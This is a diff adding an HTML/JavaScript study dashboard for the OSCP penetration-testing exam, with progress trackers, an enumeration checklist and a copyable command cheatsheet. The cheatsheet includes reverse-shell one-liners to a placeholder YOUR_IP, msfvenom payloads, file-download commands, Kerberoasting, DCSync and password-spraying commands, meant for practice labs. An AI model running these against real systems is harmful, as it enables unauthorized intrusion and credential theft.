@@ -1,0 +1,348 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OSCP Dashboard</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2330; --border:#2b3444;
+    --text:#e6edf3; --muted:#8b949e; --accent:#3fb950; --accent2:#58a6ff;
+    --warn:#d29922; --danger:#f85149; --chip:#21262d;
+    --radius:12px;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.5}
+  code,pre,.mono{font-family:ui-monospace,"Cascadia Code","Fira Code",Consolas,monospace}
+  header{padding:20px 16px;border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg,#11151c,#0d1117)}
+  .wrap{max-width:1100px;margin:0 auto;padding:0 16px}
+  h1{margin:0;font-size:22px;letter-spacing:.5px}
+  h1 .accent{color:var(--accent)}
+  .sub{color:var(--muted);font-size:13px;margin-top:4px}
+  nav{display:flex;gap:6px;flex-wrap:wrap;margin-top:16px}
+  nav button{background:var(--chip);color:var(--muted);border:1px solid var(--border);
+    padding:8px 14px;border-radius:20px;cursor:pointer;font-size:13px;font-weight:600}
+  nav button.active{background:var(--accent);color:#04260f;border-color:var(--accent)}
+  main{padding:24px 0 80px}
+  section{display:none}
+  section.active{display:block}
+  .grid{display:grid;gap:14px}
+  .cards{grid-template-columns:repeat(auto-fit,minmax(150px,1fr))}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:16px}
+  .stat{font-size:32px;font-weight:800;color:var(--accent2)}
+  .stat small{font-size:14px;color:var(--muted);font-weight:600}
+  .label{color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.6px;margin-top:4px}
+  .bar{height:8px;background:var(--panel2);border-radius:6px;overflow:hidden;margin-top:10px}
+  .bar > i{display:block;height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));width:0}
+  h2{font-size:16px;border-left:3px solid var(--accent);padding-left:10px;margin:26px 0 12px}
+  h3{font-size:14px;color:var(--accent2);margin:18px 0 8px}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--border);vertical-align:middle}
+  th{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+  tr:hover td{background:var(--panel2)}
+  input,select{background:var(--panel2);color:var(--text);border:1px solid var(--border);
+    border-radius:8px;padding:7px 9px;font-size:13px;width:100%}
+  input[type=checkbox]{width:18px;height:18px;accent-color:var(--accent);cursor:pointer}
+  .btn{background:var(--accent);color:#04260f;border:none;border-radius:8px;padding:8px 14px;
+    font-weight:700;cursor:pointer;font-size:13px}
+  .btn.sec{background:var(--chip);color:var(--text);border:1px solid var(--border)}
+  .btn.x{background:transparent;color:var(--danger);border:none;font-size:16px;cursor:pointer;padding:2px 6px}
+  .addrow{display:grid;grid-template-columns:1.4fr .8fr .8fr .8fr 1.2fr 1.2fr auto;gap:8px;margin:12px 0;align-items:center}
+  .checkitem{display:flex;gap:10px;align-items:flex-start;padding:7px 0;border-bottom:1px solid var(--border)}
+  .checkitem label{cursor:pointer}
+  .checkitem.done label{color:var(--muted);text-decoration:line-through}
+  details{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);margin:10px 0;padding:4px 14px}
+  summary{cursor:pointer;font-weight:700;padding:10px 0;color:var(--accent2)}
+  pre{background:#0a0d12;border:1px solid var(--border);border-radius:8px;padding:12px;overflow-x:auto;
+    font-size:12.5px;position:relative;margin:8px 0}
+  .copy{position:absolute;top:6px;right:6px;background:var(--chip);color:var(--muted);border:1px solid var(--border);
+    border-radius:6px;font-size:11px;padding:3px 8px;cursor:pointer}
+  .copy:hover{color:var(--text)}
+  .pill{display:inline-block;font-size:11px;padding:2px 8px;border-radius:20px;background:var(--chip);color:var(--muted)}
+  .pill.e{color:var(--accent);border:1px solid var(--accent)}
+  .pill.m{color:var(--warn);border:1px solid var(--warn)}
+  .pill.h{color:var(--danger);border:1px solid var(--danger)}
+  .muted{color:var(--muted)}
+  .tools{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0}
+  .note{background:var(--panel2);border-left:3px solid var(--warn);padding:10px 14px;border-radius:8px;font-size:13px;margin:12px 0}
+  @media(max-width:720px){.addrow{grid-template-columns:1fr 1fr;}.stat{font-size:26px}}
+</style>
+</head>
+<body>
+<header>
+  <div class="wrap">
+    <h1><span class="accent">OSCP</span> Command Dashboard</h1>
+    <div class="sub">Local progress tracker · saves in your browser · target: 70/100 to pass</div>
+    <nav id="nav">
+      <button data-tab="dash" class="active">Dashboard</button>
+      <button data-tab="boxes">Box Tracker</button>
+      <button data-tab="check">Checklist</button>
+      <button data-tab="cheat">Cheatsheet</button>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+<!-- ============ DASHBOARD ============ -->
+<section id="dash" class="active">
+  <div class="grid cards">
+    <div class="card"><div class="stat" id="s-standalone">0<small>/50</small></div><div class="label">Standalones rooted</div><div class="bar"><i id="b-standalone"></i></div></div>
+    <div class="card"><div class="stat" id="s-ad">0<small>/10</small></div><div class="label">AD chains done</div><div class="bar"><i id="b-ad"></i></div></div>
+    <div class="card"><div class="stat" id="s-unaided">0</div><div class="label">Rooted unaided</div></div>
+    <div class="card"><div class="stat" id="s-total">0</div><div class="label">Total boxes logged</div></div>
+  </div>
+
+  <h2>Exam readiness</h2>
+  <div class="card" id="readiness"></div>
+
+  <h2>Practice pipeline</h2>
+  <div class="card">
+    <p class="muted" style="margin-top:0">The plan in short — full detail in <span class="mono">practice/study-plan.md</span>.</p>
+    <ol style="margin:0;padding-left:18px">
+      <li><b>Fundamentals</b> — one topic at a time against easy boxes; internalize the loop.</li>
+      <li><b>Volume</b> — grind the TJnull list, ~40–60 standalones, manual (no Metasploit).</li>
+      <li><b>Active Directory</b> — 40% of the exam; do full foothold→DA chains with pivoting.</li>
+      <li><b>Simulate</b> — timed 24h runs (3 standalone + 1 AD set) + write a real report.</li>
+    </ol>
+  </div>
+
+  <div class="tools">
+    <button class="btn sec" onclick="exportData()">⬇ Export progress (JSON)</button>
+    <button class="btn sec" onclick="document.getElementById('imp').click()">⬆ Import</button>
+    <input type="file" id="imp" accept="application/json" style="display:none" onchange="importData(this)">
+    <button class="btn sec" onclick="resetAll()" style="color:var(--danger)">Reset all</button>
+  </div>
+</section>
+
+<!-- ============ BOX TRACKER ============ -->
+<section id="boxes">
+  <h2>Standalone boxes</h2>
+  <div class="addrow">
+    <input id="bx-name" placeholder="Box name">
+    <select id="bx-plat"><option>HTB</option><option>PG</option><option>THM</option><option>VulnHub</option><option>Lab</option></select>
+    <select id="bx-os"><option>Linux</option><option>Windows</option></select>
+    <select id="bx-diff"><option>Easy</option><option>Med</option><option>Hard</option></select>
+    <input id="bx-foot" placeholder="Foothold">
+    <input id="bx-priv" placeholder="Privesc">
+    <button class="btn" onclick="addBox()">Add</button>
+  </div>
+  <table id="box-table">
+    <thead><tr><th>Box</th><th>Plat</th><th>OS</th><th>Diff</th><th>Foothold</th><th>Privesc</th><th>Unaided</th><th></th></tr></thead>
+    <tbody id="box-body"></tbody>
+  </table>
+  <p class="muted" id="box-empty">No boxes yet — log your first one above. Be honest about "Unaided".</p>
+
+  <h2>Active Directory chains</h2>
+  <div class="addrow">
+    <input id="ad-name" placeholder="Set name">
+    <select id="ad-plat"><option>HTB</option><option>PG</option><option>PEN-200 Lab</option></select>
+    <input id="ad-foot" placeholder="Foothold" style="grid-column:span 2">
+    <input id="ad-path" placeholder="Lateral → DA path" style="grid-column:span 2">
+    <button class="btn" onclick="addAD()">Add</button>
+  </div>
+  <table id="ad-table">
+    <thead><tr><th>Set</th><th>Plat</th><th>Foothold</th><th>Path to DA</th><th>Done</th><th></th></tr></thead>
+    <tbody id="ad-body"></tbody>
+  </table>
+  <p class="muted" id="ad-empty">No AD chains yet — this is 40% of the exam, prioritize it.</p>
+</section>
+
+<!-- ============ CHECKLIST ============ -->
+<section id="check">
+  <h2>Per-target checklist</h2>
+  <div class="note">Run this on every box. Stuck? Find the item you haven't ticked — 90% of "stuck" is missed enumeration. Ticks reset per box, so uncheck when you start a new target (or just use it as a live reference).</div>
+  <div id="checklist"></div>
+  <button class="btn sec" onclick="clearChecks()" style="margin-top:14px">Uncheck all (new box)</button>
+</section>
+
+<!-- ============ CHEATSHEET ============ -->
+<section id="cheat">
+  <h2>Quick command reference</h2>
+  <p class="muted">Click a block to copy. Full detail in the topic <span class="mono">.md</span> files.</p>
+  <div id="cheatsheet"></div>
+</section>
+
+</main>
+
+<script>
+/* ---------- storage ---------- */
+const LS = {
+  get:(k,d)=>{try{const v=localStorage.getItem(k);return v?JSON.parse(v):d}catch(e){return d}},
+  set:(k,v)=>{try{localStorage.setItem(k,JSON.stringify(v))}catch(e){}}
+};
+let boxes = LS.get('oscp-boxes',[]);
+let ads   = LS.get('oscp-ads',[]);
+let checks= LS.get('oscp-checks',{});
+let ready = LS.get('oscp-ready',{});
+
+/* ---------- tabs ---------- */
+document.getElementById('nav').addEventListener('click',e=>{
+  if(e.target.tagName!=='BUTTON')return;
+  document.querySelectorAll('#nav button').forEach(b=>b.classList.remove('active'));
+  document.querySelectorAll('section').forEach(s=>s.classList.remove('active'));
+  e.target.classList.add('active');
+  document.getElementById(e.target.dataset.tab).classList.add('active');
+});
+
+/* ---------- boxes ---------- */
+function pill(d){const m={Easy:'e',Med:'m',Hard:'h'};return `<span class="pill ${m[d]||''}">${d}</span>`}
+function renderBoxes(){
+  const b=document.getElementById('box-body');b.innerHTML='';
+  boxes.forEach((x,i)=>{
+    const tr=document.createElement('tr');
+    tr.innerHTML=`<td>${esc(x.name)}</td><td>${x.plat}</td><td>${x.os}</td><td>${pill(x.diff)}</td>
+      <td class="muted">${esc(x.foot||'')}</td><td class="muted">${esc(x.priv||'')}</td>
+      <td><input type="checkbox" ${x.unaided?'checked':''} onchange="toggleUnaided(${i})"></td>
+      <td><button class="btn x" onclick="delBox(${i})">✕</button></td>`;
+    b.appendChild(tr);
+  });
+  document.getElementById('box-empty').style.display=boxes.length?'none':'block';
+  updateStats();
+}
+function addBox(){
+  const n=v('bx-name');if(!n)return;
+  boxes.push({name:n,plat:v('bx-plat'),os:v('bx-os'),diff:v('bx-diff'),foot:v('bx-foot'),priv:v('bx-priv'),unaided:false});
+  LS.set('oscp-boxes',boxes);['bx-name','bx-foot','bx-priv'].forEach(id=>document.getElementById(id).value='');
+  renderBoxes();
+}
+function delBox(i){boxes.splice(i,1);LS.set('oscp-boxes',boxes);renderBoxes()}
+function toggleUnaided(i){boxes[i].unaided=!boxes[i].unaided;LS.set('oscp-boxes',boxes);updateStats()}
+
+/* ---------- AD ---------- */
+function renderAD(){
+  const b=document.getElementById('ad-body');b.innerHTML='';
+  ads.forEach((x,i)=>{
+    const tr=document.createElement('tr');
+    tr.innerHTML=`<td>${esc(x.name)}</td><td>${x.plat}</td><td class="muted">${esc(x.foot||'')}</td>
+      <td class="muted">${esc(x.path||'')}</td>
+      <td><input type="checkbox" ${x.done?'checked':''} onchange="toggleAD(${i})"></td>
+      <td><button class="btn x" onclick="delAD(${i})">✕</button></td>`;
+    b.appendChild(tr);
+  });
+  document.getElementById('ad-empty').style.display=ads.length?'none':'block';
+  updateStats();
+}
+function addAD(){
+  const n=v('ad-name');if(!n)return;
+  ads.push({name:n,plat:v('ad-plat'),foot:v('ad-foot'),path:v('ad-path'),done:false});
+  LS.set('oscp-ads',ads);['ad-name','ad-foot','ad-path'].forEach(id=>document.getElementById(id).value='');
+  renderAD();
+}
+function delAD(i){ads.splice(i,1);LS.set('oscp-ads',ads);renderAD()}
+function toggleAD(i){ads[i].done=!ads[i].done;LS.set('oscp-ads',ads);updateStats()}
+
+/* ---------- stats + readiness ---------- */
+const readyItems=[
+  ['r1','I root most MEDIUM boxes in under ~2h with no walkthrough'],
+  ['r2','I can complete a full AD chain (foothold → Domain Admin) unaided'],
+  ['r3','I never run out of enumeration ideas when stuck'],
+  ['r4','I can pivot into a second subnet comfortably'],
+  ['r5','Notes + screenshots (flag WITH IP) are automatic for me'],
+  ['r6','I have written 2+ practice reports'],
+  ['r7','I have passed at least one timed 24h simulation']
+];
+function renderReady(){
+  const el=document.getElementById('readiness');el.innerHTML='';
+  readyItems.forEach(([k,t])=>{
+    const d=document.createElement('div');d.className='checkitem'+(ready[k]?' done':'');
+    d.innerHTML=`<input type="checkbox" id="${k}" ${ready[k]?'checked':''}><label for="${k}">${t}</label>`;
+    d.querySelector('input').addEventListener('change',e=>{ready[k]=e.target.checked;LS.set('oscp-ready',ready);renderReady();updateStats()});
+    el.appendChild(d);
+  });
+}
+function updateStats(){
+  const st=boxes.length, ad=ads.filter(a=>a.done).length, un=boxes.filter(b=>b.unaided).length;
+  set('s-standalone',st,'/50');set('s-ad',ad,'/10');
+  document.getElementById('s-unaided').textContent=un;
+  document.getElementById('s-total').textContent=boxes.length+ads.length;
+  document.getElementById('b-standalone').style.width=Math.min(100,st/50*100)+'%';
+  document.getElementById('b-ad').style.width=Math.min(100,ad/10*100)+'%';
+}
+function set(id,n,suf){document.getElementById(id).innerHTML=n+(suf?`<small>${suf}</small>`:'')}
+
+/* ---------- checklist ---------- */
+const checklist={
+ 'Recon':['Full TCP port scan (all 65535)','Version/script scan on open ports','UDP scan common ports','Hostnames added to /etc/hosts'],
+ 'Web':['Viewed site + view-source + JS','Fingerprinted tech + version','Directory brute force (+extensions)','Vhost/subdomain brute force','robots.txt / .git / backup files','CMS version → searchsploit','Tested every input (SQLi/LFI/upload/cmd)','Tried default creds on panels'],
+ 'SMB / services':['SMB null session + read shares','SMB version → known exploit?','FTP anonymous?','SNMP snmpwalk public','NFS showmount -e','RPC enumdomusers','Databases: default creds'],
+ 'Foothold':['Got shell OR valid creds','Screenshotted initial access','Upgraded to stable TTY','Grabbed local.txt + screenshot WITH IP'],
+ 'Privesc':['whoami/id, groups, OS+kernel','Ran linpeas/winpeas AND read it','sudo -l / whoami /priv','SUID/SGID / service misconfigs','Cron / scheduled tasks','Creds in configs/history/db','Internal-only listening ports','Version → matched local exploit','Got root/SYSTEM → proof.txt + screenshot WITH IP'],
+ 'Loot & pivot':['Dumped hashes/keys/secrets','Sprayed found creds everywhere','Noted extra interfaces/routes','Set up tunnel + scanned new subnet']
+};
+function renderChecklist(){
+  const el=document.getElementById('checklist');el.innerHTML='';
+  Object.entries(checklist).forEach(([grp,items])=>{
+    const h=document.createElement('h3');h.textContent=grp;el.appendChild(h);
+    items.forEach((t)=>{
+      const key=grp+'::'+t;
+      const d=document.createElement('div');d.className='checkitem'+(checks[key]?' done':'');
+      d.innerHTML=`<input type="checkbox" ${checks[key]?'checked':''}><label>${t}</label>`;
+      d.querySelector('input').addEventListener('change',e=>{checks[key]=e.target.checked;LS.set('oscp-checks',checks);d.classList.toggle('done',e.target.checked)});
+      d.querySelector('label').addEventListener('click',()=>{const c=d.querySelector('input');c.checked=!c.checked;c.dispatchEvent(new Event('change'))});
+      el.appendChild(d);
+    });
+  });
+}
+function clearChecks(){checks={};LS.set('oscp-checks',checks);renderChecklist()}
+
+/* ---------- cheatsheet ---------- */
+const cheat={
+ 'Scan':`nmap -p- --min-rate 5000 -T4 -Pn $IP -oN all.txt\nnmap -p<ports> -sC -sV -O -Pn $IP -oN deep.txt\nsudo nmap -sU --top-ports 100 $IP`,
+ 'Web':`whatweb http://$IP ; curl -sI http://$IP\nferoxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak\nffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w subdomains.txt -fs <size>`,
+ 'SMB':`netexec smb $IP -u '' -p '' --shares --rid-brute\nsmbclient -L //$IP/ -N ; smbmap -H $IP -u null\nenum4linux-ng -A $IP`,
+ 'Reverse shell + listener':`rlwrap nc -lvnp 4444\nbash -i >& /dev/tcp/YOUR_IP/4444 0>&1\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f\n# windows: use revshells.com`,
+ 'Stabilize shell':`python3 -c 'import pty;pty.spawn("/bin/bash")'\n# Ctrl-Z then:  stty raw -echo; fg   (Enter Enter)\nexport TERM=xterm; stty rows 50 cols 200`,
+ 'msfvenom':`msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o s.elf\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o s.exe`,
+ 'Transfers':`python3 -m http.server 80\nwget http://YOUR_IP/f -O /tmp/f\ncertutil -urlcache -f http://YOUR_IP/nc.exe nc.exe\nimpacket-smbserver share . -smb2support`,
+ 'Linux privesc':`sudo -l ; id ; uname -a\nfind / -perm -4000 2>/dev/null   # SUID -> GTFOBins\ngetcap -r / 2>/dev/null ; cat /etc/crontab ; ./pspy64\n./linpeas.sh | tee lp.out`,
+ 'Windows privesc':`whoami /priv    # SeImpersonate -> PrintSpoofer/GodPotato\nwhoami /all ; systeminfo ; cmdkey /list\n. .\\PowerUp.ps1; Invoke-AllChecks\n.\\winPEASx64.exe`,
+ 'Active Directory':`netexec smb $DC -u $USER -p "$PASS" --shares        # (Pwn3d!)=admin\nnetexec smb 10.10.10.0/24 -u $USER -p "$PASS"       # spray/PtH sweep\nbloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC -c All --zip\nimpacket-GetUserSPNs $DOMAIN/$USER:"$PASS" -dc-ip $DC -request  # kerberoast 13100\nimpacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC  # AS-REP 18200\nevil-winrm -i $IP -u $USER -p "$PASS"\nimpacket-secretsdump $DOMAIN/$USER:"$PASS"@$DC     # DCSync`,
+ 'Pivoting':`# Ligolo: ./proxy -selfcert | agent -connect YOUR_IP:11601 -ignore-cert\n#         ip route add <subnet> dev ligolo ; start\n# Chisel: ./chisel server -p 8000 --reverse | ./chisel client YOUR_IP:8000 R:socks\nssh -D 1080 user@$IP   # then proxychains`,
+ 'Cracking':`hashcat -m 1000 h rockyou.txt   # NTLM\nhashcat -m 1800 h rockyou.txt   # linux $6$\nhashcat -m 13100 h rockyou.txt  # kerberoast\nhashcat -m 18200 h rockyou.txt  # AS-REP\nssh2john id_rsa > k ; zip2john f.zip > z`
+};
+function renderCheat(){
+  const el=document.getElementById('cheatsheet');el.innerHTML='';
+  Object.entries(cheat).forEach(([title,cmd])=>{
+    const d=document.createElement('details');
+    d.innerHTML=`<summary>${title}</summary><pre><button class="copy">copy</button><code>${esc(cmd)}</code></pre>`;
+    d.querySelector('.copy').addEventListener('click',ev=>{
+      navigator.clipboard.writeText(cmd).then(()=>{ev.target.textContent='copied!';setTimeout(()=>ev.target.textContent='copy',1200)});
+    });
+    el.appendChild(d);
+  });
+}
+
+/* ---------- import/export/reset ---------- */
+function exportData(){
+  const data={boxes,ads,checks,ready,exported:new Date().toISOString()};
+  const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
+  const a=document.createElement('a');a.href=URL.createObjectURL(blob);
+  a.download='oscp-progress.json';a.click();
+}
+function importData(inp){
+  const f=inp.files[0];if(!f)return;const r=new FileReader();
+  r.onload=()=>{try{const d=JSON.parse(r.result);
+    boxes=d.boxes||[];ads=d.ads||[];checks=d.checks||{};ready=d.ready||{};
+    LS.set('oscp-boxes',boxes);LS.set('oscp-ads',ads);LS.set('oscp-checks',checks);LS.set('oscp-ready',ready);
+    renderBoxes();renderAD();renderChecklist();renderReady();updateStats();
+    alert('Progress imported.');}catch(e){alert('Invalid file.')}};
+  r.readAsText(f);
+}
+function resetAll(){if(confirm('Erase ALL saved progress? This cannot be undone.')){
+  ['oscp-boxes','oscp-ads','oscp-checks','oscp-ready'].forEach(k=>localStorage.removeItem(k));
+  boxes=[];ads=[];checks={};ready={};
+  renderBoxes();renderAD();renderChecklist();renderReady();updateStats();}}
+
+/* ---------- utils ---------- */
+function v(id){return document.getElementById(id).value.trim()}
+function esc(s){return String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}
+
+/* ---------- init ---------- */
+renderBoxes();renderAD();renderChecklist();renderReady();renderCheat();updateStats();
+</script>
+</body>
+</html>
